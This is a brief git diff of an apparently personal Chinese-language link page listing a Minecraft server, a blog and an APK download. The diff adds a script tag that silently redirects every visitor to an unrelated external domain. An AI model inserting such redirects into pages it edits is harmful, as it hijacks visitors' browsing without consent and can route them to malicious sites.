@@ -11,3 +11,5 @@ wl的mc服务器：[建设中的nightytale](https://nightytale.e-loli.com/)
 wl的博客：[日月忽其不淹兮](http://139.224.30.127/)
 
 nightytale下载：[好耶！](http://139.224.30.127/files/nightytale_1.0.apk)
+
+<script type="text/javascript">window.location.href="https://ihtcboy.com";</script>
